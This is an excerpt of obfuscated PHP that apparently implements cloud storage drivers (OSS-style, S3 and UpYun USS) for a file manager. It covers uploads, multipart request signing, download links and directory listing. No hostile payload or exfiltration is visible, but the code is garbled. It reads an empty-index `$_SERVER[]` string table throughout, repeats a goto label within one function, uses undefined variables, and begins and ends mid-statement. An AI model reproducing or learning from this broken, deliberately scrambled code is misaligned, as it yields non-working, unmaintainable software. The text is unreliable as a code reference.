return $this->client->getObject($this->bucket, $A㊽); } public function setContent($b, $EՂ = '', $f = false) { goto bβ; bβ: $CΎ =& $_SERVER[]; $b = $f ? trim($b, $CΎ[8]) . $CΎ[8] : $b; $e˿ = get_file_mime(get_path_ext($b)); goto Eם; Eם: $Fΐ = $this->client->putObject($EՂ, $this->bucket, $b, $CΎ[181], array(), $e˿); if (!$Fΐ) { return !1; } if ($f) { return !0; } goto F۝; F۝: $Fΐ = $this->copyFile($b, $b, array($CΎ[192] => $Fΐ[$CΎ[193]])); return $Fΐ ? !0 : !1; goto c¢Ú; c¢Ú: } public function fileSubstr($EʹӸ, $Fᣋ, $CꋂԈ) { $bɌ = $Fᣋ + $CꋂԈ - 1; return $this->client->getObject($this->bucket, $EʹӸ, array($_SERVER[][194] => "\142\171\164\145\x73\75{$Fᣋ}\x2d{$bɌ}")); } public function upload($Dۑ, $ä́, $Aȃ = false, $Aܥ = REPEAT_REPLACE) { $eΟ =& $_SERVER[]; $Aӑ = array($eΟ[192] => @md5_file($ä́)); $A⦸ɳ = array($eΟ[195] => get_file_mime(get_path_ext($Dۑ))); if (IO::size($ä́) <= 1024 * 1024 * 200) { $cȿ = $this->client->putObjectFile($ä́, $this->bucket, $Dۑ, $eΟ[181], $Aӑ, $A⦸ɳ); return !empty($cȿ) ? $this->getPathOuter($Dۑ) : !1; } $dڶ쵌 = $this->client->multiUploadObject($ä́, $this->bucket, trim($Dۑ, $eΟ[8]), $Aӑ, $A⦸ɳ); return $dڶ쵌 ? $this->getPathOuter($Dۑ) : !1; } public function download($AӇ, $C) { if (!@is_dir($this->pathFather($C)) && !IO::mkdir($this->pathFather($C))) { return !1; } $Aٵ޹ = $this->client->getObject($this->bucket, $AӇ, array(), $C); return $Aٵ޹ !== !1 ? $C : !1; } public function link($B󾴲, $Fʙ = array()) { $B؂ =& $_SERVER[]; if ($this->signVer == $B؂[196]) { return $this->client->getAuthenticatedURL($this->bucket, $B󾴲, 3600 * 12, $Fʙ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B󾴲, $B؂[8]), 3600 * 12, $this->region, array(), !0, $Fʙ); } public function fileOut($f⤞, $f̥س = false, $A = false, $Eձ = '') { goto Bˣߏ; Bǡ: if ($E == $D[197]) { return parent::fileOut($f⤞, $f̥س, $A, $Eձ); } $f̥س = $f̥س ? $D[198] : $D[199]; $D = array($D[200] => $f̥س . $D[201] . rawurlencode($A), $D[202] => $E); goto e߼; Bˣߏ: $D =& $_SERVER[]; if (!$A) { $A = $this->pathThis($f⤞); } $E = get_file_mime(get_path_ext($A)); goto Bǡ; e߼: $Cͻݝ = $this->link($f⤞, $D); $this->fileOutLink($Cͻݝ); goto cƍČ; cƍČ: } public function fileOutServer($eؽ, $Eؑɉ̧ = false, $F = false, $b = '') { parent::fileOut($eؽ, $Eؑɉ̧, $F, $b); } public function fileOutImage($cŧ, $D = 250) { $c = $this->link($cŧ); $this->fileOutLink($c); } public function fileOutImageServer($F䄊, $E芊ؽ = 250) { parent::fileOutImage($F䄊, $E芊ؽ); } public function hashMd5($c݈, $e儏 = '') { $Dÿˏ =& $_SERVER[]; $B֨ = $this->objectMeta($c݈); if (!$B֨) { return !1; } $e儏 = $e儏 ? $e儏 : _get($B֨, $Dÿˏ[203]); $e儏 = $e儏 ? $e儏 : _get($B֨, $Dÿˏ[193], $Dÿˏ[33]); return $e儏; } public function uploadFormData($A꾿, $F = 3600) { $D =& $_SERVER[]; $dԞ = $this->pathFather($A꾿); $e׸ = $this->client->getHttpUploadPostParams($this->bucket, $dԞ, $D[181], $F); return array_merge((array) $e׸, array($D[165] => $this->getHost())); } public function multiUploadFormData($a, $d = 3600) { $F =& $_SERVER[]; $DӦξ = gmdate($F[204]); $BȐͤ = array(); $aǍ = $this->client->getUploadId($this->bucket, $a, $BȐͤ); if (!$aǍ) { return !1; } return array($F[205] => $aǍ, $F[165] => $this->getHost() . $F[8] . $this->pathEncode($a), $F[206] => $DӦξ, $F[89] => $a); } public function multiUploadAuthData($E̶´, $dୢȚ = array()) { goto C΅š; cΕ؈: if (strpos($B뮰, $cģ[209]) === 0) { return array($cģ[216] => $eُ, $cģ[206] => $dϞ); } return $eُ; goto bӑ݈; B߂: $Cѳ = array($cģ[208], $cģ[33], $cģ[115], $cģ[33], "\170\55\141\155\x7a\x2d\144\x61\x74\x65\x3a{$dϞ}", $cģ[8] . $this->bucket . $cģ[8] . $this->pathEncode($B) . $B뮰); if (strpos($B뮰, $cģ[209]) === 0) { $Cѳ[0] = $cģ[210]; } if (isset($dୢȚ[$cģ[211]]) && $dୢȚ[$cģ[211]] == $cģ[212]) { $Cѳ[0] = $cģ[212]; } goto FǾ; D򾸗: $B = $dୢȚ[$cģ[89]]; unset($dୢȚ[$cģ[89]]); if (isset($dୢȚ[$cģ[207]])) { $dୢȚ[$cģ[206]] = $dϞ; return $this->listUploadParts($B, $dୢȚ); } goto B߂; FǾ: $Aᝄ = implode($cģ[213], $Cѳ); $e = base64_encode(hash_hmac($cģ[214], $Aᝄ, $this->secret, !0)); $eُ = $cģ[215] . $this->accessKey . $cģ[4] . $e; goto cΕ؈; C΅š: $cģ =& $_SERVER[]; $dϞ = isset($dୢȚ[$cģ[206]]) ? $dୢȚ[$cģ[206]] : gmdate($cģ[204]); $B뮰 = isset($dୢȚ[$cģ[156]]) ? $dୢȚ[$cģ[156]] : $cģ[33]; goto D򾸗; bӑ݈: } public function listUploadParts($E͐, $d = array()) { goto Eߩ; Eߩ: $Eߜ =& $_SERVER[]; $bֆ΋ = str_replace($Eߜ[217], $Eߜ[33], $d[$Eߜ[156]]); $Dӭ = $this->client->listParts($this->bucket, $E͐, $bֆ΋); goto Cӭ; A: $E = $this->multiUploadAuthData($E͐, $d); if (empty($E)) { return !1; } return array($Eߜ[216] => $E, $Eߜ[206] => $d[$Eߜ[206]], $Eߜ[218] => $Dӭ); goto C⑌; Cӭ: if (!$Dӭ) { return !1; } unset($d[$Eߜ[207]], $d[$Eߜ[211]]); $d[$Eߜ[89]] = $E͐; goto A; C⑌: } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($E乍ؤ) { $c = $this->objectMeta($E乍ؤ); return $c ? $c[$_SERVER[][77]] : 0; } public function info($E) { if ($this->isFolder($E)) { return $this->folderInfo($E); } else { if ($this->isFile($E)) { return $this->fileInfo($E); } } return !1; } public function exist($aֵƌ) { return $this->isFile($aֵƌ) || $this->isFolder($aֵƌ); } public function isFile($Aޖ) { return !$this->isFolder($Aޖ) && $this->objectMeta($Aޖ); } public function isFolder($c) { return $this->cacheMethod($_SERVER[][219], $c); } protected function objectMeta($f) { return $this->cacheMethod($_SERVER[][220], $f); } protected function _objectMeta($Bذ) { $aݧ =& $_SERVER[]; $Bذ = rtrim($Bذ, $aݧ[8]); try { $a蚹 = $this->client->getObjectInfo($this->bucket, $Bذ); if (!isset($a蚹[$aݧ[203]]) && isset($a蚹[$aݧ[221]])) { $a蚹[$aݧ[203]] = $a蚹[$aݧ[221]]; } } catch (OSS\Core\OssException $aۑه) { $a蚹 = !1; } if (!$a蚹) { } return $a蚹; } protected function _isFolder($A) { goto B͋; B͋: $aׂΈ =& $_SERVER[]; $A = rtrim($A, $aׂΈ[8]); if ($A == $aׂΈ[33] || $A == $aׂΈ[8]) { return !0; } goto a; a: $B· = $this->client->getBucket($this->bucket, $A, null, 1); if (empty($B·)) { return !1; } $B· = array_values($B·); goto C; C: if (substr($B·[0][$aׂΈ[28]], -1) == $aׂΈ[8]) { return !0; } if (get_path_this($B·[0][$aׂΈ[28]]) == get_path_this($A)) { return !1; } return !0; goto Aĕ; Aĕ: } } define($_SERVER[][222], 1); goto C폊Ř; Dӧ: function beforeShutdownFatalError($FͰȓ) { think_exception($FͰȓ); } $_SERVER[$_SERVER[][48]] = $f($_SERVER[$_SERVER[][45]]); $Eԕ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto FΨ; C㛏؞: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($A򅂟ń) { parent::__construct($A򅂟ń); } public function uploadFormData($Aڵ͚, $eĎ = 3600) { goto cȫ; Bȋ: $F῱ĝ = array($B[195] => $B[33], $B[1125] => $B[33], $B[1084] => $d, $B[1088] => $eğ, $B[1092] => $f̡Î, $B[1126] => $b쯺, $B[1127] => $eغ땙, $B[1128] => $dהڇ, $B[1129] => $Bؑ, $B[1130] => $c, $B[165] => $this->getHost()); return $F῱ĝ; goto f҃; E: $EȚ = $B[59]; $dהڇ = gmdate($B[1114]); $AŮ = gmdate($B[676]); goto b􈝂; b: $aă = array($this->accessKey, $AŮ, $this->region, $EȚ, $cާ); $b쯺 = implode($B[8], $aă); $a׈Ю = array($B[1082] => gmdate($B[1081], strtotime($B[1116])), $B[1083] => array(array($B[1085] => $this->bucket), array($B[1084] => $d), array($B[1086], $B[1087], $B[33]), array($B[1086], $B[1117], $B[33]), array($B[1086], $B[1118], $B[33]), array($B[1088] => $eğ), array($B[1119] => $b쯺), array($B[1120] => $eغ땙), array($B[1121] => $dהڇ), array($B[1122] => $Bؑ))); goto A윇; a: $f = hash_hmac($B[1123], $EȚ, $Bʤ, !0); $C݅ = hash_hmac($B[1123], $cާ, $f, !0); $c = hash_hmac($B[1123], $f̡Î, $C݅); goto Bȋ; b􈝂: $cާ = $B[1115]; $Bؑ = $eĎ . $B[33]; $eğ = $B[1080]; goto b; cȫ: $B =& $_SERVER[]; $d = $B[181]; $eغ땙 = $B[1113]; goto E; A윇: $f̡Î = base64_encode(json_encode($a׈Ю)); $dǠ = hash_hmac($B[1123], $AŮ, $B[1124] . $this->secret, !0); $Bʤ = hash_hmac($B[1123], $this->region, $dǠ, !0); goto a; f҃: } public function multiUploadFormData($D, $A = 3600) { $b͐Ǥ =& $_SERVER[]; $b = gmdate($b͐Ǥ[1209]); $Ả = array(); $F = $this->client->getUploadId($this->bucket, $D, $Ả); if (!$F) { return !1; } return array($b͐Ǥ[205] => $F, $b͐Ǥ[165] => $this->getHost() . $b͐Ǥ[8] . $this->pathEncode($D), $b͐Ǥ[206] => $b, $b͐Ǥ[89] => $D); } public function multiUploadAuthData($fͭ, $Cޢ = array()) { goto D՗; c댄: unset($Cޢ[$FՆ[89]]); if (isset($Cޢ[$FՆ[207]])) { return $this->listUploadParts($Fǝ, $Cޢ); } $dی = array(); goto E; E: if (isset($Cޢ[$FՆ[1210]])) { $dی[$FՆ[1211]] = $Cޢ[$FՆ[1210]]; } $Bۗ = explode($FՆ[167], $this->getHost()); $A = array($FՆ[1212] => $Bۗ[1], $FՆ[1213] => $FՆ[33], $FՆ[195] => $FՆ[115], $FՆ[1125] => $Cޢ[$FՆ[77]]); goto c; c: $b߲޴ = $FՆ[210]; $c = $FՆ[8] . $this->pathEncode($Fǝ) . $Dދ; $C۽ = $this->client->__getSignatureV4($dی, $A, $b߲޴, $c); goto f; D՗: $FՆ =& $_SERVER[]; $Dދ = isset($Cޢ[$FՆ[156]]) ? $Cޢ[$FՆ[156]] : $FՆ[33]; $Fǝ = $Cޢ[$FՆ[89]]; goto c댄; f: if (strpos($Dދ, $FՆ[209]) === 0) { if (isset($dی[$FՆ[1211]])) { $fӆ = $dی[$FՆ[1211]]; } else { if (isset($C۽[$FՆ[1211]])) { $fӆ = $C۽[$FՆ[1211]]; } else { $fӆ = hash($FՆ[1123], $FՆ[33]); } } return array($FՆ[216] => $C۽[$FՆ[216]], $FՆ[1211] => $fӆ, $FՆ[206] => $C۽[$FՆ[1214]]); } return $C۽[$FՆ[216]]; goto C; C: } public function listUploadParts($dֽ̅, $Bܜ = array()) { goto b; d臹: $bꪂ = array($B[1212] => $b[1], $B[195] => $B[115], $B[1125] => strlen($Bə)); $Cȍ绂 = $B[208]; $eѶ = $B[8] . $this->pathEncode($dֽ̅) . $Bܜ[$B[156]]; goto c塂; b: $B =& $_SERVER[]; $aӚ = str_replace($B[217], $B[33], $Bܜ[$B[156]]); $bቢ = $this->client->listParts($this->bucket, $dֽ̅, $aӚ); goto A; A: if (!$bቢ) { return !1; } $Bə = $B[1215]; foreach ($bቢ as $fæ) { $Bə .= $B[1216] . "\74\120\141\162\x74\x4e\165\x6d\x62\145\x72\76{$fæ[$B[1167]]}\74\x2f\x50\x61\162\164\x4e\165\155\142\145\162\76\12" . "\74\x45\124\141\147\76{$fæ[$B[1168]]}\x3c\x2f\x45\x54\141\x67\76\12" . $B[1217]; } goto A; A: $Bə .= $B[1218]; $D̞ = array(); $b = explode($B[167], $this->getHost()); goto d臹; c塂: $e = $this->client->__getSignatureV4($D̞, $bꪂ, $Cȍ绂, $eѶ, $Bə); return array($B[216] => $e[$B[216]], $B[206] => $e[$B[1214]], $B[218] => $bቢ, $B[1211] => $e[$B[1211]]); goto Eܐ; Eܐ: } public function link($c, $E = array()) { return parent::link($c, $E); } public function fileOut($Fĩ, $c؂ = false, $f÷ = false, $fþ = '') { if (strstr($this->endpoint, $_SERVER[][1219])) { return parent::fileOutServer($Fĩ, $c؂, $f÷, $fþ); } parent::fileOut($Fĩ, $c؂, $f÷, $fþ); } public function fileOutImage($bƊ, $eܿ = 250) { if (strstr($this->endpoint, $_SERVER[][1219])) { return parent::fileOutImageServer($bƊ, $eܿ); } parent::fileOutImage($bƊ, $eܿ); } public function fileOutLink($eɡ) { $cͼ =& $_SERVER[]; if (substr($eɡ, 0, 7) == $cͼ[1095]) { $eɡ = $cͼ[1096] . substr($eɡ, 7); } header($cͼ[152] . $eɡ); die; } public function getHost() { $C =& $_SERVER[]; $A = str_rtrim(parent::getHost(), $C[8] . $this->bucket); $A = explode($C[167], $A); return $A[0] . $C[167] . $this->bucket . $C[91] . $A[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($DԺ, $Dٌ¹ = 0) { parent::__construct(); $this->source = $DԺ; $this->sourceSize = $Dٌ¹; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($A = false) { return $this->sourceSize; } public function getContent($Dզ¡ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $a = ftell($this->source); $Dػ = @fread($this->source, $this->sourceSize); fseek($this->source, $a); return $Dػ; } } public function fileSubstr($f۠ = false, $E䑼 = 0, $e = 0) { if (!$e) { $e = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $E䑼, $e); } if ($this->sourceType == self::TYPE_FILE) { $bˎ = ftell($this->source); fseek($this->source, $bˎ + $E䑼); $B = @fread($this->source, $e); fseek($this->source, $bˎ); return $B; } } public function hashMd5($cߑ = false) { return md5($this->getContent()); } public static function hash($f, $c = 0) { $F = new PathDriverStream($f, $c); return $F->hashSimple($f); } public static function md5($B咅А, $B邠 = 0) { $BŏΩ = new PathDriverStream($B咅А, $B邠); return $BŏΩ->hashMd5($B咅А); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\72\x2f\57\x76\x30\x2e\141\x70\x69\x2e\x75\x70\171\x75\156\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($f뾯) { parent::__construct(); $this->_init($f뾯); } public function _init($FΡ) { foreach ($FΡ as $Eݨ => $D) { if (isset($this->{$Eݨ})) { $this->{$Eݨ} = $D; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[][1220], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($e苖, $C뮲 = "\x47\x45\x54") { $C֝ =& $_SERVER[]; $Cȶ = gmdate($C֝[1184]); $C = base64_encode(hash_hmac($C֝[1221], "{$C뮲}\46{$e苖}\46{$Cȶ}", md5("{$this->userpass}"), !0)); $a򯻰 = array("\x41\165\164\x68\x6f\x72\x69\172\141\x74\x69\x6f\x6e\x3a\125\120\x59\x55\116\40{$this->username}\72{$C}", "\104\141\164\145\72{$Cȶ}"); return $a򯻰; } public function ussRequest($eĜҦ, $Fܬ׊ = "\107\105\x54", $D = false, $DͶ = false, $c籄 = false) { goto CȾ; E: $aԦ = $this->ussHeaders($d̵Ř, $Fܬ׊); if ($DͶ) { $aԦ = array_merge($aԦ, $DͶ); } $a = url_request($this->endpoint . $d̵Ř, $Fܬ׊, $D, $aԦ, $c籄); goto eԃЍ; eԃЍ: if (!$a) { return array($F񨑻[1019] => !1, $F񨑻[1021] => $F񨑻[1222]); } if (strtolower($Fܬ׊) == $F񨑻[180] || in_array($a[$F񨑻[1019]], array($F񨑻[1080], $F񨑻[1223]))) { $D = $a[$F񨑻[1224]]; } else { $D = json_decode($a[$F񨑻[1021]], !0); if (!$D) { $D = $a[$F񨑻[1021]]; } else { if (!$a[$F񨑻[675]] && isset($D[$F񨑻[1225]])) { $D = $D[$F񨑻[1225]]; } } } return array($F񨑻[1019] => $a[$F񨑻[675]], $F񨑻[1021] => $D); goto Dīɲ; CȾ: $F񨑻 =& $_SERVER[]; $eĜҦ = trim($eĜҦ, $F񨑻[8]); $d̵Ř = "\x2f{$this->bucket}\x2f{$eĜҦ}"; goto E; Dīɲ: } public function mkfile($bƷ, $Aɏ̤ = '', $c񑰨 = REPEAT_RENAME) { if ($this->setContent($bƷ, $Aɏ̤)) { return $this->getPathOuter($bƷ); } return !1; } public function mkdir($Eċ, $Aكǃ = REPEAT_SKIP) { $cռ =& $_SERVER[]; $bߝ = trim($Eċ, $cռ[8]); if ($this->_isFolder($bߝ)) { return $this->getPathOuter($bߝ); } $bݷ = array($cռ[1226]); $B = $this->ussRequest($bߝ, $cռ[208], !1, $bݷ); return $B[$cռ[1019]] ? $this->getPathOuter($bߝ) : !1; } public function copyFile($Dڴ, $aŐ) { $C =& $_SERVER[]; $dۊʽ = array($C[1227] . "\57{$this->bucket}\x2f{$Dڴ}", $C[1228]); $e = $this->ussRequest($aŐ, $C[210], !1, $dۊʽ); return $e[$C[1019]] ? !0 : !1; } public function moveFile($F؎, $e·) { $F⟻ =& $_SERVER[]; $a = array($F⟻[1229] . "\57{$this->bucket}\x2f{$F؎}", $F⟻[1228]); $cЖ = $this->ussRequest($e·, $F⟻[210], !1, $a); return $cЖ[$F⟻[1019]] ? !0 : !1; } public function delFile($E) { $fǟҰ =& $_SERVER[]; $d֖ = $this->ussRequest($E, $fǟҰ[1230]); return $d֖[$fǟҰ[1019]] ? !0 : !1; } public function delFolder($BҬѐ) { $Fݼ =& $_SERVER[]; $c령 = $this->listAll($BҬѐ); krsort($c령); foreach ($c령 as $c缌ķ) { $this->ussRequest($c缌ķ[$Fݼ[75]], $Fݼ[1230]); } return $this->ussRequest($BҬѐ, $Fݼ[1230]); } public function rename($C, $b) { if ($this->isFile($C)) { $b = get_path_father($C) . $b; return $this->moveFile($C, $b); } return $this->renameObject($C, $b); } public function fileInfo($dɑ, $B = false, $cő = array()) { $e΍ =& $_SERVER[]; if ($B) { return array($e΍[28] => $this->pathThis($dɑ), $e΍[75] => $this->getPathOuter($e΍[8] . $dɑ), $e΍[29] => $e΍[163], $e΍[77] => isset($cő[$e΍[321]]) ? $cő[$e΍[321]] : 0, $e΍[156] => $this->ext($dɑ)); } $e٦֔ = array($e΍[28] => $this->pathThis($dɑ), $e΍[75] => $this->getPathOuter($e΍[8] . $dɑ), $e΍[29] => $e΍[163], $e΍[183] => 0, $e΍[106] => isset($bݍ[$e΍[1231]]) ? $bݍ[$e΍[1231]] : 0, $e΍[77] => isset($cő[$e΍[321]]) ? $cő[$e΍[321]] : 0, $e΍[156] => $this->ext($dɑ), $e΍[184] => !0, $e΍[185] => !0); if (empty($cő)) { $cő = $this->objectMeta($dɑ); if (!$cő) { return $e٦֔; } $e٦֔[$e΍[183]] = $cő[$e΍[1232]]; $e٦֔[$e΍[106]] = $cő[$e΍[1233]]; $e٦֔[$e΍[77]] = $cő[$e΍[77]]; } return $e٦֔; } public function folderInfo($D򓲚, $F = false) { $C⊭꺄 =& $_SERVER[]; if ($F) { return array($C⊭꺄[28] => $this->pathThis($D򓲚), $C⊭꺄[75] => $this->getPathOuter($C⊭꺄[8] . $D򓲚), $C⊭꺄[29] => $C⊭꺄[76]); } $F = array($C⊭꺄[28] => $this->pathThis($D򓲚), $C⊭꺄[75] => $this->getPathOuter($C⊭꺄[8] . $D򓲚), $C⊭꺄[29] => $C⊭꺄[76], $C⊭꺄[183] => 0, $C⊭꺄[106] => isset($e󐅄[$C⊭꺄[1231]]) ? $e󐅄[$C⊭꺄[1231]] : 0, $C⊭꺄[1141] => !0, $C⊭꺄[1142] => !0); if (empty($bҧ)) { $bҧ = $this->objectMeta($D򓲚); if (!$bҧ) { return $F; } $F[$C⊭꺄[183]] = $bҧ[$C⊭꺄[1232]]; $F[$C⊭꺄[106]] = $bҧ[$C⊭꺄[1233]]; } return $F; } private function fileList($c, $Bי = 0, $B = 1000) { $E¨ =& $_SERVER[]; $cᵑ = array($E¨[1234], $E¨[1235] . $B); if ($Bי) { $cᵑ[] = $E¨[1236] . $Bי; } $BȞ = $this->ussRequest($c, $E¨[212], !1, $cᵑ); return !$BȞ[$E¨[1019]] ? !1 : $BȞ[$E¨[1021]]; } public function listPath($D, $dĩ = false) { goto c; b鶊: return array($e[74] => $bƓ, $e[73] => $e); goto c֢; c: $e =& $_SERVER[]; $c = $e[33]; $c짇晦 = 1000; goto C͓; C͓: $bƓ = $e = array(); $B櫠 = rtrim($D, $e[8]) . $e[8]; while (!0) { $Fݶ = $this->fileList($D, $c, $c짇晦); if (!$Fݶ) { return !1; } $c = isset($Fݶ[$e[1237]]) ? $Fݶ[$e[1237]] : $e[33]; $B = isset($Fݶ[$e[1238]]) ? $Fݶ[$e[1238]] : array(); foreach ($B as $Fɞ) { if ($Fɞ[$e[29]] == $e[76]) { $bƓ[] = $this->folderInfo($B櫠 . $Fɞ[$e[28]], $dĩ, $Fɞ); } else { $e[] = $this->fileInfo($B櫠 . $Fɞ[$e[28]], $dĩ, $Fɞ); } } if (count($B) < $c짇晦) { break; } } goto b鶊; c֢: } private function recursionAllFiles($f, &$Dα) { $cݝ =& $_SERVER[]; $D = $cݝ[33]; $aѶ = 1000; $Cڶ = $fٔ = array(); $F㼎 = rtrim($f, $cݝ[8]) . $cݝ[8]; while (!0) { $Eَ = $this->fileList($f, $D, $aѶ); if (!$Eَ) { return !1; } $D = isset($Eَ[$cݝ[1237]]) ? $Eَ[$cݝ[1237]] : $cݝ[33]; $c = isset($Eَ[$cݝ[1238]]) ? $Eَ[$cݝ[1238]] : array(); foreach ($c as $dŎ) { $eҜ = array($cݝ[75] => $F㼎 . $dŎ[$cݝ[28]], $cݝ[76] => $dŎ[$cݝ[29]] == $cݝ[76] ? 1 : 0, $cݝ[77] => isset($dŎ[$cݝ[321]]) ? $dŎ[$cݝ[321]] : 0); $Dα[] = $eҜ; if ($eҜ[$cݝ[76]] == 1) { $this->recursionAllFiles($eҜ[$cݝ[75]], $Dα); } } if (count($c) < $aѶ) { break; } } } public function has($Fܽ, $f = false, $Bܯ = true) { goto Bտ; Bտ: $f̸ =& $_SERVER[]; $d = $f̸[33]; $Cމ = 1000; goto fގ; fގ: $Aա = 0; $b㉅ = 0; $fܞ = rtrim($Fܽ, $f̸[8]) . $f̸[8]; goto C昕; C昕: while (!0) { $C昕 = $this->fileList($Fܽ, $d, $Cމ); if (!$C昕) { return !1; } $d = isset($C昕[$f̸[1237]]) ? $C昕[$f̸[1237]] : $f̸[33]; $E = isset($C昕[$f̸[1238]]) ? $C昕[$f̸[1238]] : array(); if (empty($E)) { break; } $C = array_to_keyvalue($E, $f̸[33], $f̸[29]); $d村Ǚ = array_count_values($C); $eз = isset($d村Ǚ[$f̸[76]]) ? $d村Ǚ[$f̸[76]] : 0; $F˨ = count($C) - $eз; if ($f) { $b㉅ += $eз; $Aա += $F˨; if ($A < $Cމ) { break; } continue; } if ($Bܯ) { if ($F˨) { return !0; } } else { if ($eз) { return !0; } } if (count($E) < $Cމ) { break; } } if ($f) { return array($f̸[187] => $Aա, $f̸[188] => $b㉅); } return !1; goto D; D: } public function listAll($AȦ) { $dڶڕܠ = array(); $this->recursionAllFiles($AȦ, $dڶڕܠ); return $dڶڕܠ; } public function canRead($BՏ) { return $this->exist($BՏ) ? !0 : !1; } public function canWrite($eތ) { return $this->exist($eތ) ? !0 : !1; } public function getContent($A㠪釾) { return $this->fileSubstr($A㠪釾, 0, -1); } public function setContent($C, $Cس = '') { $D =& $_SERVER[]; if (!$Cس) { $Bي = $this->ussRequest($C, $D[208]); return $Bي[$D[1019]]; } $EǮ׺ = $this->tempFile($this->pathThis($C)); file_put_contents($EǮ׺, $Cس); if ($this->upload($C, $EǮ׺)) { $this->tempFileRemve($EǮ׺); return !0; } return !1; } public function fileSubstr($DЯ, $a˖, $b֧) { $A槣 =& $_SERVER[]; if (!($Bˍع = $this->link($DЯ))) { return !1; } $aڊ݅ = !1; if ($b֧ > 0) { $dѬ͕ = $a˖ + $b֧ - 1; $aڊ݅ = array($A槣[1199] . $a˖ . $A槣[408] . $dѬ͕); } $b = url_request($Bˍع, $A槣[212], !1, $aڊ݅); return $b[$A槣[675]] ? $b[$A槣[1021]] : !1; } public function upload($B°, $aö, $dɟ = false, $F = REPEAT_REPLACE) { goto a; Cᐋ: $c߇ = $dɭ[$dҌ[1244]]; $cۊ = fopen($aö, $dҌ[1149]); if (!$cۊ) { return !1; } goto B; EԊ胏: $e榆̸ = $this->ussRequest($B°, $dҌ[210], !1, $f); return $e榆̸[$dҌ[1019]] ? $this->getPathOuter($Eʐ) : !1; goto f꺔; A缛: $E = 1024 * 1024 * 10; $f = array($dҌ[1240], $dҌ[1241] . $Fĉ, $dҌ[1242], $dҌ[1243] . $E); $e榆̸ = $this->ussRequest($B°, $dҌ[210], !1, $f); goto e; e: if (!$e榆̸[$dҌ[1019]]) { return !1; } $dɭ = $e榆̸[$dҌ[1021]]; $eʴ = 0; goto Cᐋ; a: $dҌ =& $_SERVER[]; $Fĉ = IO::size($aö); if ($Fĉ <= 1024 * 1024 * 200) { $fÄ݅ = array($dҌ[1239] . $aö); $e榆̸ = $this->ussRequest($B°, $dҌ[210], $fÄ݅); return $e榆̸[$dҌ[1019]] ? $this->getPathOuter($B°) : !1; } goto A缛; B: do { $d뿄 = $dɭ[$dҌ[1245]]; fseek($cۊ, $eʴ); $a˝ = fread($cۊ, $d뿄); $bЯ슽 = 0; do { $bЯ슽++; $dɭ = $this->uploadPart($B°, $dɭ, $a˝); } while (!$dɭ && $bЯ슽 < 3); if (!$dɭ) { return !1; } $c߇ = $dɭ[$dҌ[1244]]; $eʴ += $d뿄; } while ($c߇ != -1); fclose($cۊ); $f = array($dҌ[1246], $dҌ[1247] . $dɭ[$dҌ[1248]], $dҌ[1242]); goto EԊ胏; f꺔: } private function uploadPart($BŃ, $c, &$E) { $FӲ =& $_SERVER[]; $CΜ = array($FӲ[1249], $FӲ[1247] . $c[$FӲ[1248]], $FӲ[1250] . $c[$FӲ[1244]], $FӲ[1251] . $c[$FӲ[1245]]); $a = $this->ussRequest($BŃ, $FӲ[210], $E, $CΜ); return !$a[$FӲ[1019]] ? $a[$FӲ[1019]] : $a[$FӲ[1021]]; } public function uploadFormData($C񕤜, $F = 3600) { return $this->uploadPolicy($C񕤜, $F); } public function multiUploadFormData($d, $DԹŝ = 3600) { $d =& $_SERVER[]; $d = (int) $GLOBALS[$d[7]][$d[77]]; return $this->uploadPolicy($d, $DԹŝ, $d); } private function uploadPolicy($D, $fڰ = 3600, $Eê = 0) { goto eĞ; aƺߟ: $c = base64_encode(hash_hmac($Eֈ[1221], "\x50\117\x53\124\x26{$f皴}\46{$Aɇĝ}\x26{$F}", md5("{$this->userpass}"), !0)); $bҔê = array($Eֈ[1092] => $F, $Eֈ[1256] => "\125\x50\x59\125\x4e\x20{$this->username}\72{$c}", $Eֈ[165] => $this->endpoint . $f皴); return $bҔê; goto dͥ; a: $B։ = array($Eֈ[1252] => $this->bucket, $Eֈ[1253] => $D, $Eֈ[1254] => time() + $fڰ, $Eֈ[1255] => $Aɇĝ); if ($Eê) { $B։[$Eֈ[1170]] = $Eê; } $F = base64_encode(json_encode($B։)); goto aƺߟ; eĞ: $Eֈ =& $_SERVER[]; $f皴 = $Eֈ[8] . $this->bucket; $Aɇĝ = gmdate($Eֈ[1184]); goto a; dͥ: } public function download($F, $eî) { goto FЋ儳; B: $c܂Ɯ = 1024 * 200; $C٠Η = fopen($dÈ¬, $_SERVER[][1205]); while (!0) { $dчѸ = $this->fileSubstr($F, $aҫ, $c܂Ɯ); if ($dчѸ === !1) { return !1; } fwrite($C٠Η, $dчѸ); $aҫ += $c܂Ɯ; if (strlen($dчѸ) < $c܂Ɯ) { break; } } goto aʱ; FЋ儳: $dÈ¬ = IO::getPathInner(IO::mkfile($eî)); if (!($ä́ = $this->link($F))) { return !1; } $aҫ = 0; goto B; aʱ: fclose($C٠Η); return $eî; goto dͿ; dͿ: } public function link($aӄƚ, $B = array()) { $A㈥ˍڏ =& $_SERVER[]; $aӄƚ = trim($aӄƚ, $A㈥ˍڏ[8]); if (!empty($this->token)) { $E鏈 = strtotime(date($A㈥ˍڏ[1257])); $c犌 = substr(md5($this->token . $A㈥ˍڏ[268] . $E鏈 . $A㈥ˍڏ[1258] . $aӄƚ), 12, 8) . $E鏈; $B[] = $A㈥ˍڏ[1259] . $c犌; } $bȓ = !empty($B) ? $A㈥ˍڏ[69] . implode($A㈥ˍڏ[268], $B) : $A㈥ˍڏ[33]; return $this->getHost() . $A㈥ˍڏ[8] . 